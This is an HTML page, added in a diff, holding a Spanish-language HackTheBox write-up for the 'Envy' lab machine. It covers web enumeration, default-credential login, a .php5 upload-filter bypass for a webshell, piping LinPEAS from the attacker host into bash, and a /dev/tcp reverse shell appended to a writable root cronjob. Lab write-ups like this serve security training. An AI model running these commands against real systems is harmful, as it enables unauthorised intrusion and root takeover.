@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - Envy | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-warning text-dark fs-6">Medium</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">Web</span>
+        <span class="badge bg-secondary">File Upload</span>
+        <span class="badge bg-secondary">dirsearch</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Envy</h1>
+      <p class="text-secondary mb-3">Enumeración web con dirsearch revela panel admin y directorio de uploads. Bypass de restricciones de subida de archivos para obtener RCE.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-calendar3"></i> Jun 2023</span>
+        <span><i class="bi bi-clock"></i> ~60 min</span>
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">dirsearch</span>
+        <span class="badge bg-dark border border-secondary p-2">burp suite</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+        <span class="badge bg-dark border border-secondary p-2">linpeas</span>
+      </div>
+    </div>
+
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Reconocimiento</h4>
+      <p class="text-secondary">Enumeración de directorios con dirsearch sobre el servicio HTTP:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>dirsearch -x 404,403,505 -u http://10.10.110.101</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>301  http://10.10.110.101/admin     → /admin/
+302  http://10.10.110.101/admin/    → /admin/login.php
+200  http://10.10.110.101/admin/login.php
+200  http://10.10.110.101/config.php
+200  http://10.10.110.101/modules/
+200  http://10.10.110.101/uploads/
+200  http://10.10.110.101/tmp/</code></pre>
+      </div>
+      <div class="alert-custom p-3 rounded">
+        <i class="bi bi-exclamation-triangle text-warning me-2"></i>
+        <code>/uploads/</code> accesible públicamente y <code>/config.php</code> devuelve respuesta vacía — posiblemente legible.
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-lightning-charge"></i> Acceso al panel admin</h4>
+      <p class="text-secondary">Probamos credenciales por defecto en <code>/admin/login.php</code>:</p>
+      <div class="code-block mb-3">
+        <pre><code>admin : admin    ✗
+admin : password ✗
+admin : admin123 ✓</code></pre>
+      </div>
+      <p class="text-secondary">El panel tiene funcionalidad de subida de archivos. Intentamos subir una webshell PHP — el servidor bloquea la extensión <code>.php</code>. Bypass con extensión doble:</p>
+      <div class="code-block mb-3">
+        <pre><code>shell.php.jpg  → bloqueado
+shell.pHp      → bloqueado
+shell.php5     → <span class="text-success">aceptado</span></code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>curl "http://10.10.110.101/uploads/shell.php5?cmd=id"
+uid=33(www-data) gid=33(www-data)</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-warning border-left-yellow mb-3"><i class="bi bi-arrow-up-right-circle"></i> Escalada de privilegios</h4>
+      <p class="text-secondary">Subimos LinPEAS para enumerar vectores de escalada:</p>
+      <div class="code-block mb-3">
+        <pre><code># Servidor en nuestra máquina
+python3 -m http.server 8000
+
+# En la shell de www-data
+curl http://LHOST:8000/linpeas.sh | bash</code></pre>
+      </div>
+      <p class="text-secondary">LinPEAS encuentra credenciales en <code>config.php</code> y un cronjob ejecutado como root:</p>
+      <div class="code-block mb-3">
+        <pre><code>* * * * * root /opt/maintenance.sh</code></pre>
+      </div>
+      <p class="text-secondary">El script es escribible — añadimos una reverse shell:</p>
+      <div class="code-block mb-3">
+        <pre><code>echo "bash -i >& /dev/tcp/LHOST/5555 0>&1" >> /opt/maintenance.sh</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>nc -lvnp 5555
+whoami
+<span class="text-danger fw-bold">root</span></code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-success border-left-green mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary">
+        <li>El bypass de extensiones de archivo es fundamental — <code>.php5</code>, <code>.phtml</code>, <code>.phar</code> frecuentemente no están en la blacklist.</li>
+        <li>Los cronjobs ejecutados como root con scripts escribibles son vectores de escalada muy comunes.</li>
+        <li>LinPEAS automatiza la enumeración de post-explotación de forma muy eficiente.</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
